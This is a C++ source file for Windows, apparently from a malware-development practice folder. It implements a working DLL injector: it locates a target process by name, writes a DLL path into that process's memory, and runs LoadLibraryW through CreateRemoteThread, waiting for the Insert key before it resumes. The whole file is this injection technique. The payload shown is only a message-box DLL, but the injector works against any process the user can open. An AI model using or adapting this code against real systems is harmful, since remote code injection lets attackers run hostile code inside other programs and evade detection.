#include <stdio.h>
#include <memory.h>
#include <Windows.h>
#include <tlhelp32.h>

// #define okay(msg, ...) printf("[+]", msg "\n",##__VA_ARGS__)

const char* msg = "Your shoes are ugly";
wchar_t path[MAX_PATH] = L"C:\\Users\\leoin\\OneDrive\\Desktop\\maldev\\msgbox.dll";
size_t dllPathSize = sizeof(path);
PROCESSENTRY32 tlProc;
HMODULE hKern32;

int main(int argc, char** argv) {
	
	if (argc < 2) {
		printf("[-] Usage: %s <process_name> opt: <path_to_dll> *don't forget abt escape chars\n" , argv[0]);
	}
	// Get the length of the wide char string required
	int wideStrLength = MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, nullptr, 0);

	// Allocate memory for the wide char string
	wchar_t* procName = new wchar_t[wideStrLength];

	// Convert the multibyte string to wide char
	MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, procName, wideStrLength);

	printf("[*] Fetching Snapshot\n");

	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPALL, 0);
	if (hSnap == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to get snapshot of system\n");
		return -1;
	}
	//int length = MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, nullptr, 0);
	//wchar_t* procName = new wchar_t[length];
	//MultiByteToWideChar(CP_UTF8, 0, argv[1], -1, procName, length);
	tlProc.dwSize = sizeof(PROCESSENTRY32);

	printf("[*] Scanning processes and comparing names\n");
	Process32First(hSnap, &tlProc);

	do {
		//printf("Process name: %ws\n", tlProc.szExeFile);
		if (!wcscmp(tlProc.szExeFile, procName)) break;
	} while (Process32Next(hSnap, &tlProc));
	
	if (wcscmp(tlProc.szExeFile, procName)) {
		printf("[-] Error, could not find process with name: %ws ... Cleaning up\n", procName);
		CloseHandle(hSnap);
		return -1;
	}
	printf("[+] Found process... Process Name: %ws, Process ID: %ld\n", tlProc.szExeFile, tlProc.th32ProcessID);

	printf("[*] Getting handle to process\n");
	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, tlProc.th32ProcessID);
	
	if (hProc == NULL) {
		printf("[-] Error getting handle to process... cleaning and returning\n");
		CloseHandle(hSnap);
		delete[] procName;
		return -1;
	}

	printf("[+] Got handle to process!\n");

	LPVOID pProcMem = VirtualAllocEx(hProc, NULL, dllPathSize, (MEM_COMMIT | MEM_RESERVE), PAGE_READWRITE);
	printf("[*] Allocated memory in process\n");
	if (!pProcMem) {
		printf("[-] Failed to reserve memory\n");
		CloseHandle(hSnap);
		CloseHandle(hProc);
		delete[] procName;
	}
	WriteProcessMemory(hProc, pProcMem, path, dllPathSize, NULL);

	printf("[+] Wrote path of dll to process memory!\n");

	hKern32 = GetModuleHandle(L"Kernel32");
	if (hKern32 == NULL) {
		printf("[-] Failed to get handle to kernel32 for loadlibrary\n");
		CloseHandle(hSnap);
		CloseHandle(hProc);
		delete[] procName;
		return -1;
	}
	LPTHREAD_START_ROUTINE pStartRoutine = (LPTHREAD_START_ROUTINE)GetProcAddress(hKern32, "LoadLibraryW");
	
	DWORD threadID;

	HANDLE hThread = CreateRemoteThread(hProc, NULL, 0, pStartRoutine, pProcMem, 0, &threadID);
	if (hThread == NULL) {
		printf("[-] Failed to create remote thread\n");
		CloseHandle(hProc);
		CloseHandle(hSnap);
		delete[] procName;
		return -1;
	}
	printf("[+] Created handle to remote thread (in suspended mode. Press <insert> to resume. TID: %ld\n", threadID);
	while (1) {
		SHORT state = GetAsyncKeyState(VK_INSERT);
		if (state & 0x8000) {
			// Insert key is pressed
			printf("[*] Insert key is pressed. Resuming thread\n");
			if (!hThread) { break; }
			ResumeThread(hThread);
			// Add your code here to execute when the Insert key is pressed
			break;
		}
		// Optional: Sleep to reduce CPU usage
		Sleep(10);
	}
	printf("[*] Waiting on object to exit\n");
	WaitForSingleObject(hThread, INFINITE);

	delete[] procName;
	CloseHandle(hSnap);
	CloseHandle(hProc);
	CloseHandle(hThread);
	return 0;
}


